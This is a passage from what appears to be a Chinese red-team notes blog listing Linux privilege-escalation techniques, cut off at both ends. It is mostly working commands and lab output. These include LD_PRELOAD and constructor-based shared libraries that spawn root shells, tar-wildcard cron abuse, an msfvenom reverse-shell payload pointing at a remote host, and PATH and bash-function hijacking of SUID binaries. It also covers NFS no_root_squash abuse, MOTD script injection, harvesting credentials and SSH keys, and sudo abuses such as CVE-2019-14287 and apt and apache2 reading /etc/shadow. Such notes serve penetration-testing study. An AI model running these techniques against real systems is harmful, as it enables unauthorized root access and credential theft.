class="hljs-string">&quot;/bin/bash&quot;</span>);<br>&#125;<br><br><span class="hljs-comment"># gcc 编译为共享对象文件</span><br>gcc -fPIC -shared -o shell.so shell.c -nostartfiles<br><br><span class="hljs-comment"># 运行用户拥有sudo权限的程序，并且使用此共享对象文件</span><br>sudo LD_PRELOAD=/home/user/ldpreload/shell.so find<br></code></pre></td></tr></table></figure><h3 id="自动任务文件权限提权"><a href="#自动任务文件权限提权" class="headerlink" title="自动任务文件权限提权"></a>自动任务文件权限提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看自动任务文件</span><br><span class="hljs-built_in">cat</span> /etc/crontab<br><br><span class="hljs-comment"># 根据自动任务文件内容进行下一步考虑，如果是以root权限定时运行脚本，则可以考虑对脚本进行写入，来反弹shell或者其他提权手法</span><br></code></pre></td></tr></table></figure><h3 id="自动任务-PATH-环境变量提权"><a href="#自动任务-PATH-环境变量提权" class="headerlink" title="自动任务 PATH 环境变量提权"></a>自动任务 PATH 环境变量提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 如果当前用户家目录被写入了crontab中的环境变量里。且自动任务的脚本不是绝对路径，则可以创建一个同名文件来替换执行，需要补充的是crontab中的环境变量的顺序决定了查找相对路径文件的次序</span><br></code></pre></td></tr></table></figure><h3 id="自动任务通配符提权"><a href="#自动任务通配符提权" class="headerlink" title="自动任务通配符提权"></a>自动任务通配符提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 自动任务调用的脚本中使用了tar命令并包含了通配符</span><br>user@RedteamNotes:~$ <span class="hljs-built_in">cat</span> /usr/local/bin/compress.sh<br><span class="hljs-comment">#!/bin/sh</span><br><span class="hljs-built_in">cd</span> /home/user<br>tar czf /tmp/backup.tar.gz *<br><br><span class="hljs-comment"># 生成反弹shell的可执行文件，将其上传到tar命令操作的目录中</span><br>┌──(kali㉿kali)-[~/Musics/PrivEscaLabs]<br>└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 - f elf -o shell.elf<br>[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload<br>[-] No <span class="hljs-built_in">arch</span> selected, selecting <span class="hljs-built_in">arch</span>: x64 from the payload<br>No encoder specified, outputting raw payload<br>Payload size: 74 bytes<br>Final size of elf file: 194 bytes<br>Saved as: shell.elf<br><br><span class="hljs-comment"># 为可执行文件添加运行权限</span><br>user@RedteamNotes:~$ <span class="hljs-built_in">chmod</span> +x shell.elf<br><br><span class="hljs-comment"># 创建特殊的文件名，使得通配符在和tar命令结合的情况下，执行指定的文件</span><br>user@RedteamNotes:~$ <span class="hljs-built_in">touch</span> /home/user/--checkpoint=1<br>user@RedteamNotes:~$ <span class="hljs-built_in">touch</span> /home/user/--checkpoint-action=<span class="hljs-built_in">exec</span>=shell.elf<br></code></pre></td></tr></table></figure><h3 id="SUID-可执行文件已知利用提权"><a href="#SUID-可执行文件已知利用提权" class="headerlink" title="SUID 可执行文件已知利用提权"></a>SUID 可执行文件已知利用提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Musics/PrivEscaLabs]<br>└─$ searchsploit exim 4.84<br>-----------------------------------------------------------------------------<br>Exploit Title<br>| Path<br>-----------------------------------------------------------------------------<br>Exim - <span class="hljs-string">&#x27;perl_startup&#x27;</span> Local Privilege Escalation (Metasploit)<br>| linux/local/39702.rb<br>Exim 4.84-3 - Local Privilege Escalation<br>| linux/local/39535.sh<br>Exim &lt; 4.86.2 - Local Privilege Escalation<br>| linux/local/39549.txt<br>Exim &lt; 4.90.1 - <span class="hljs-string">&#x27;base64d&#x27;</span> Remote Code Execution<br>| linux/remote/44571.py<br>PHPMailer &lt; 5.2.20 with Exim MTA - Remote Code Execution<br>| php/webapps/42221.py<br>-----------------------------------------------------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure><h3 id="SUID-共享库注入提权"><a href="#SUID-共享库注入提权" class="headerlink" title="SUID 共享库注入提权"></a>SUID 共享库注入提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 根据文件名也可以猜测出一些东西，</span><br>user@RedteamNotes:~$ /usr/local/bin/suid-so<br>Calculating something, please <span class="hljs-built_in">wait</span>...<br>[===================================================================&gt;]<br>99 %<br>Done.<br><br><span class="hljs-comment"># 使用strings命令查看该文件，发现了一个路径/home/user/.config/libcalc.so</span><br>strings /usr/local/bin/suid-so<br><br><span class="hljs-comment"># 进一步查看</span><br>user@RedteamNotes:~$ strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep <span class="hljs-string">&#x27;/home/user&#x27;</span><br>open(<span class="hljs-string">&quot;/home/user/.config/libcalc.so&quot;</span>, O_RDONLY) = -1 ENOENT (No such file<br><br><span class="hljs-comment"># 按照上述路径，编译一个同名的动态链接库</span><br>user@RedteamNotes:~/.config$ vim libcalc.c<br>user@RedteamNotes:~/.config$ <span class="hljs-built_in">cat</span> libcalc.c<br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br>static void inject() __attribute__((constructor));<br>void <span class="hljs-function"><span class="hljs-title">inject</span></span>() &#123;<br>setuid(0);<br>system(<span class="hljs-string">&quot;/bin/bash -p&quot;</span>);<br>&#125;<br><br><span class="hljs-comment"># 编译</span><br>user@RedteamNotes:~/.config$ gcc -shared -fPIC -o libcalc.so libcalc.c<br><br><span class="hljs-comment"># 执行</span><br>user@RedteamNotes:~/.config$ /usr/local/bin/suid-so<br>Calculating something, please <span class="hljs-built_in">wait</span>...<br>bash-4.1<span class="hljs-comment"># whoami</span><br>root<br><br></code></pre></td></tr></table></figure><p><code>static void inject() __attribute__((constructor));</code>：声明一个名为 inject 的静态函数，并使用 GCC 的 <code>__attribute__((constructor))</code> 属性。这个属性使得在程序或动态库加载时自动执行 inject 函数，而不需要显式调用它。</p><h3 id="SUID-环境变量利用提权"><a href="#SUID-环境变量利用提权" class="headerlink" title="SUID 环境变量利用提权"></a>SUID 环境变量利用提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 尝试运行有SUID的程序</span><br>user@RedteamNotes:~$ /usr/local/bin/suid-env<br>Starting web server: apache2httpd (pid 1596) already running<br>.<br><br><span class="hljs-comment"># 查看可见字符，得到了一个命令</span><br>user@RedteamNotes:~$ strings /usr/local/bin/suid-env<br>/lib64/ld-linux-x86-64.so.2<br>5q;Xq<br>__gmon_start__<br>libc.so.6<br>setresgid<br>setresuid<br>system<br>__libc_start_main<br>GLIBC_2.2.5<br>fff.<br>fffff.<br>l$ L<br>t$(L<br>|<span class="hljs-variable">$0H</span><br>service apache2 start<br><br><span class="hljs-comment"># 由于使用的命令并不是绝对路径，因此可以使用环境变量来劫持，编译一个同名的可执行文件，然后将当前目录写入到环境变量中，这样程序运行的时候会优先从当前目录下寻找service程序</span><br>user@RedteamNotes:~$ vim service.c<br>user@RedteamNotes:~$ gcc -o service service.c<br>user@RedteamNotes:~$ <span class="hljs-built_in">export</span> PATH=.:<span class="hljs-variable">$PATH</span><br>user@RedteamNotes:~$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin<br>:/usr/local/sbin<br></code></pre></td></tr></table></figure><h3 id="巧用-SUID-shell-功能提权-1"><a href="#巧用-SUID-shell-功能提权-1" class="headerlink" title="巧用 SUID-shell 功能提权 #1"></a>巧用 SUID-shell 功能提权 #1</h3><p>bash 版本小于 4.2 时，可以定义函数，并且用路径的组合作为函数名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看可见字符，发现一个带有绝对路径的程序运行</span><br>user@RedteamNotes:~$ strings /usr/local/bin/suid-env2<br>/lib64/ld-linux-x86-64.so.2<br>__gmon_start__<br>libc.so.6<br>setresgid<br>setresuid<br>system<br>__libc_start_main<br>GLIBC_2.2.5<br>fff.<br>fffff.<br>l$ L<br>t$(L<br>|<span class="hljs-variable">$0H</span><br>/usr/sbin/service apache2 start<br><br><span class="hljs-comment"># 查看bash版本，小于4.2则可能存在这个提权利用</span><br>user@RedteamNotes:~$ /bin/bash --version<br>GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)<br>Copyright (C) 2009 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later<br><br><span class="hljs-comment"># 定义包含路径的函数</span><br>user@RedteamNotes:~$ <span class="hljs-keyword">function</span> /usr/sbin/service &#123; /bin/bash -p; &#125;<br><br><span class="hljs-comment"># 将该函数或可执行文件导出为环境变量</span><br>user@RedteamNotes:~$ <span class="hljs-built_in">export</span> -f /usr/sbin/service<br><br><span class="hljs-comment"># 执行SUID的程序</span><br>user@RedteamNotes:~$ /usr/local/bin/suid-env2<br>root@RedteamNotes:~<span class="hljs-comment"># whoami</span><br>root<br></code></pre></td></tr></table></figure><h3 id="巧用-SUID-shell-功能提权-2"><a href="#巧用-SUID-shell-功能提权-2" class="headerlink" title="巧用 SUID-shell 功能提权 #2"></a>巧用 SUID-shell 功能提权 #2</h3><p>bash 版本低于 4.4 时，可以在调试中对环境变量进行设置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">env</span> -i SHELLOPTS=xtrace PS4=<span class="hljs-string">&#x27;$(cp /bin/bash /tmp/rootbash; chmod +xs</span><br><span class="hljs-string">/tmp/rootbash)&#x27;</span> /usr/local/bin/suid-env2<br></code></pre></td></tr></table></figure><ul><li><code>-i</code> 参数表示 “ignore environment”，即忽略现有的环境变量。</li><li><code>xtrace</code> 选项被设置， shell 执行每个命令之前都打印该命令。PS4 环境变量定义了这个打印输出的格式。PS4 被设置为一个命令序列，该命令序列首先会复制 <code>/bin/bash</code> 到&#x2F; <code>tmp/rootbash</code>，然后将新文件设置为 SUID 和可执行状态。</li><li><code>SHELLOPTS</code> 是一个只读的 Bash 环境变量，用于列出当前已启用的 shell 选项。</li><li><code>PS </code> 代表 “Prompt String”。这是用于定义 shell 提示符的环境变量。</li></ul><h3 id="密码和密钥历史文件提权"><a href="#密码和密钥历史文件提权" class="headerlink" title="密码和密钥历史文件提权"></a>密码和密钥历史文件提权</h3><p>注意家目录下的历史文件</p><h3 id="密码和密钥配置文件查看提权"><a href="#密码和密钥配置文件查看提权" class="headerlink" title="密码和密钥配置文件查看提权"></a>密码和密钥配置文件查看提权</h3><p>配置文件中可能有用户名和密码，因此要有足够的敏感度，对这方面的文件不能有遗漏</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@debian:~$ <span class="hljs-built_in">ls</span> -liha<br>total 56K<br>155042 drwxr-xr-x 5 user user 4.0K May 15 2020 .<br>155041 drwxr-xr-x 3 root root 4.0K May 15 2017 ..<br>155056 -rw------- 1 user user 140 May 15 2020 .bash_history<br>155045 -rw-r--r-- 1 user user 220 May 12 2017 .bash_logout<br>155043 -rw-r--r-- 1 user user 3.2K May 14 2017 .bashrc<br>375363 drwxr-xr-x 2 user user 4.0K May 13 2017 .irssi<br>155071 drwx------ 2 user user 4.0K May 15 2020 .john<br>156485 -rw------- 1 user user 137 May 15 2017 .lesshst<br>155047 -rw-r--r-- 1 user user 212 May 15 2017 myvpn.ovpn<br>155048 -rw------- 1 user user 11 May 15 2020 .nano_history<br>155044 -rw-r--r-- 1 user user 725 May 13 2017 .profile<br>155049 drwxr-xr-x 8 user user 4.0K May 15 2020 tools<br>155057 -rw------- 1 user user 6.2K May 15 2020 .viminfo<br><br>user@debian:~$ <span class="hljs-built_in">cat</span> myvpn.ovpn<br>client<br>dev tun<br>proto udp<br>remote 10.10.10.10 1194<br>resolv-retry infinite<br>nobind<br>persist-key<br>persist-tun<br>ca ca.crt<br>tls-client<br>remote-cert-tls server<br>auth-user-pass /etc/openvpn/auth.txt<br>comp-lzo<br>verb 1<br>reneg-sec 0<br><br>user@debian:~$ <span class="hljs-built_in">cat</span> /etc/openvpn/auth.txt<br>root<br>password123<br>user@debian:~$ su<br>Password:<br>root@debian:<br></code></pre></td></tr></table></figure><h3 id="SSH-密钥敏感信息提权"><a href="#SSH-密钥敏感信息提权" class="headerlink" title="SSH 密钥敏感信息提权"></a>SSH 密钥敏感信息提权</h3><p>.ssh 文件可能在用户家目录，也可能在根目录下，并且其中可能存在私钥泄露，并且注意本地创建文件写入私钥内容后文件权限要更改为 600，否则无法登录，除此之外还能会出现算法和签名不匹配的情况，因此有时需要指定算法类型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@debian:~$ <span class="hljs-built_in">ls</span> -liah /.ssh<br>total 12K<br>1175041 drwxr-xr-x 2 root root 4.0K Aug 25 2019 .<br>2 drwxr-xr-x 22 root root 4.0K Aug 25 2019 ..<br>1175042 -rw-r--r-- 1 root root 1.7K Aug 25 2019 root_key<br>┌──(kali㉿kali)-[~/Musics/PrivEscaLabs]<br>└─$ ssh -i id_rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.174.100<br></code></pre></td></tr></table></figure><h3 id="NFS-提权"><a href="#NFS-提权" class="headerlink" title="NFS 提权"></a>NFS 提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># /etc/exports文件中可以看到更详尽的NFS设置</span><br>user@RedteamNotes:~$ <span class="hljs-built_in">cat</span> /etc/exports<br><span class="hljs-comment"># /etc/exports: the access control list for filesystems which may be</span><br>exported<br><span class="hljs-comment"># to NFS clients. See exports(5).</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example for NFSv2 and NFSv3:</span><br><span class="hljs-comment"># /srv/homes hostname1(rw,sync,no_subtree_check)</span><br>hostname2(ro,<span class="hljs-built_in">sync</span>,no_subtree_check)<br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example for NFSv4:</span><br><span class="hljs-comment"># /srv/nfs4 gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)</span><br><span class="hljs-comment"># /srv/nfs4/homes gss/krb5i(rw,sync,no_subtree_check)</span><br><span class="hljs-comment">#</span><br>/tmp *(rw,<span class="hljs-built_in">sync</span>,insecure,no_root_squash,no_subtree_check)<br><span class="hljs-comment">#/tmp *(rw,sync,insecure,no_subtree_check)</span><br><br><span class="hljs-comment"># 发现存在 no_root_squash，它的作用是允许 root 用户在 NFS 客户端机器上拥有和在 NFS 服务器上相同的权限。那么我们可以在把本机上切换到 root 用户，挂载后将本地 root 用户的程序复制到 NFS 目录中</span><br><span class="hljs-comment"># 挂载</span><br>┌──(root㉿kali)-[/home/kali/Musics/PrivEscaLabs]<br>└─<span class="hljs-comment"># mkdir /tmp/nfs</span><br>┌──(root㉿kali)-[/home/kali/Musics/PrivEscaLabs]<br>└─<span class="hljs-comment"># mount -o rw,vers=3 10.10.10.12:/tmp /tmp/nfs</span><br>Created symlink /run/systemd/system/remote-fs.target.wants/rpcstatd.<br>service → /lib/systemd/system/rpc-statd.service.<br>┌──(root㉿kali)-[/home/kali/Musics/PrivEscaLabs]<br>└─<span class="hljs-comment"># cd /tmp/nfs</span><br><br><span class="hljs-comment"># 生成root属主的可执行文件写入到共享目录中</span><br>┌──(root㉿kali)-[/tmp/nfs]<br>└─<span class="hljs-comment"># msfvenom -p linux/x86/exec CMD=&quot;/bin/bash -p&quot; -f elf -o</span><br>/tmp/nfs/shell.elf<br>[-] No platform was selected, choosing Msf::Module::Platform::Linux from<br>the payload<br>[-] No <span class="hljs-built_in">arch</span> selected, selecting <span class="hljs-built_in">arch</span>: x86 from the payload<br>No encoder specified, outputting raw payload<br>Payload size: 48 bytes<br>Final size of elf file: 132 bytes<br>Saved as: /tmp/nfs/shell.elf<br><br><span class="hljs-comment"># 增加运行权限</span><br>┌──(root㉿kali)-[/tmp/nfs]<br>└─<span class="hljs-comment"># chmod +xs shell.elf</span><br></code></pre></td></tr></table></figure><h3 id="内核利用提权"><a href="#内核利用提权" class="headerlink" title="内核利用提权"></a>内核利用提权</h3><p>内核漏洞利用方法很简单：1.确定内核版本，2.为目标系统的内核版本搜索并找到一个漏洞利用代码。3.运行漏洞利用</p><p>可以直接使用已编译的漏洞利用，如 Binary Exploits( <a href="https://gitlab.com/exploitdatabase/exploitdb-bin-sploits">https://gitlab.com/exploitdatabase/exploitdb-bin-sploits</a> )上就有比较全的内核漏洞编译文件，或可节约编译的探索时间，但的确有一定几率不成功，需要重新编译，甚至本地编译。Linux Kernel CVEs( <a href="https://www.linuxkernelcves.com/">https://www.linuxkernelcves.com</a> )是一个直观的内核 CVE 检索目录。</p><h3 id="doas-less-vi-提权"><a href="#doas-less-vi-提权" class="headerlink" title="doas less+vi 提权"></a>doas less+vi 提权</h3><p>用 <code>find / -perm -u=s -type f 2&gt;/dev/null</code> 发现有 <code>/usr/bin/doas</code> 可执行文件。根据 doas 的用法，查看其配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">RedteamNotes$ <span class="hljs-built_in">cat</span> /etc/doas.conf<br>permit nopass keepenv user as root cmd /usr/bin/less args /var/log/authlog<br>permit nopass keepenv root as root<br></code></pre></td></tr></table></figure><p>执行上述命令，在 less 界面按 v 键启动 vi 编辑状态。按照 vi 启动 shell 的命令语法，在 vi 中执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">:!sh<br></code></pre></td></tr></table></figure><h3 id="利用-MOTD-机制提权"><a href="#利用-MOTD-机制提权" class="headerlink" title="利用 MOTD 机制提权"></a>利用 MOTD 机制提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 枚举</span><br><span class="hljs-built_in">ls</span> -al /etc/update-motd.d/<br><br><span class="hljs-comment"># 利用</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cp /bin/bash /home/RedteamNotes/bash &amp;&amp; chmod u+s /home/RedteamNotes/bash&quot;</span> &gt;&gt; /etc/update-motd.d/00-header<br></code></pre></td></tr></table></figure><h3 id="可预测-PRNG-暴力破解-SSH-提权"><a href="#可预测-PRNG-暴力破解-SSH-提权" class="headerlink" title="可预测 PRNG 暴力破解 SSH 提权"></a>可预测 PRNG 暴力破解 SSH 提权</h3><p>在 OpenSSL 0.9.8c-1 &lt; 0.9.8g-9 的 debian 及衍生版本中有可预测伪随机谁生成机制的 SSH 暴力破解利用</p><p>5622.txt 中介绍了使用方法。</p><ol><li>下载 <a href="https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/binsploits/5622.tar.bz2">https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/binsploits/5622.tar.bz2</a> 密钥对包</li><li>解压后，用 grep -lr 在其中搜索你枚举或搜索到的公钥中前 20-30 个字符。找到后，取用对应的私钥，完成 ssh 的登录。</li></ol><h3 id="sudo-风暴"><a href="#sudo-风暴" class="headerlink" title="sudo 风暴"></a>sudo 风暴</h3><h4 id="CVE-2019-14287"><a href="#CVE-2019-14287" class="headerlink" title="CVE-2019-14287"></a>CVE-2019-14287</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 切换用户</span><br>sudo -u jack<br><br><span class="hljs-comment"># 前提1</span><br>(ALL, !root) NOPASSWD: /bin/bash<br><br><span class="hljs-comment"># 前提2</span><br><span class="hljs-comment"># CVE-2019-14287影响的是1.8.28及其之前的sudo版本。这个漏洞在1.8.28p1版本中被修复。</span><br><br><span class="hljs-comment"># -1会被解释为0</span><br>sudo -u<span class="hljs-comment">#-1 /bin/bash</span><br><br><span class="hljs-comment"># 可以查看sudo的版本</span><br>sudo -V | grep version <br></code></pre></td></tr></table></figure><h3 id="sudo-apt"><a href="#sudo-apt" class="headerlink" title="sudo apt"></a>sudo apt</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo apt update -o APT::Update::Pre-Invoke::=/bin/bash<br>Failed to start apt-news.service: Transport endpoint is not connected<br>See system logs and <span class="hljs-string">&#x27;systemctl status apt-news.service&#x27;</span> <span class="hljs-keyword">for</span> details.<br>Failed to start esm-cache.service: Transport endpoint is not connected<br>See system logs and <span class="hljs-string">&#x27;systemctl status esm-cache.service&#x27;</span> <span class="hljs-keyword">for</span> details.<br>root@RedteamNotes:/tmp<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><code>-o APT::Update::Pre-Invoke::=/bin/bash</code>：这是一个 apt 命令的选项，用于设置在运行 apt update 之前执行的预处理脚本。::类似于名字空间，逐级访问子配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 另外两种利用方法，取决于版本等环境因素。apt-get用法与此相同</span><br><span class="hljs-comment"># 1</span><br>sudo apt changelog apt<br>!/bin/sh<br><br><span class="hljs-comment"># 2</span><br>TF=$(<span class="hljs-built_in">mktemp</span>)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Dpkg::Pre-Invoke &#123;&quot;/bin/sh;false&quot;&#125;&#x27;</span> &gt; <span class="hljs-variable">$TF</span><br>sudo apt install -c <span class="hljs-variable">$TF</span> sl<br></code></pre></td></tr></table></figure><h4 id="sudo-apache2"><a href="#sudo-apache2" class="headerlink" title="sudo apache2"></a>sudo apache2</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用此选项加载 /etc/shadow 文件，将产生一条错误信息</span><br>user@RedteamNotes:~$ sudo apache2 -f /etc/shadow<br>Syntax error on line 1 of /etc/shadow:<br>Invalid <span class="hljs-built_in">command</span><br><span class="hljs-string">&#x27;root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.</span><br><span class="hljs-string">jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::&#x27;</span>, perhaps misspelled or defined by a<br>module not included <span class="hljs-keyword">in</span> the server configuration<br></code></pre></td></tr></table></figure><h4 id="sudo-ash"><a href="#sudo-ash" class="headerlink" title="sudo ash"></a>sudo ash</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo /usr/bin/ash<br><span class="hljs-comment"># whoami</span><br>root<br></code></pre></td></tr></table></figure><p>ash 是 Bourne shell（sh）的一个轻量级版本，它消耗的系统资源更少，通常用于嵌入式系统和资源有限的环境。</p><h4 id="sudo-awk"><a href="#sudo-awk" class="headerlink" title="sudo awk"></a>sudo awk</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">jackie@RedteamNotes:~$ sudo /usr/bin/awk <span 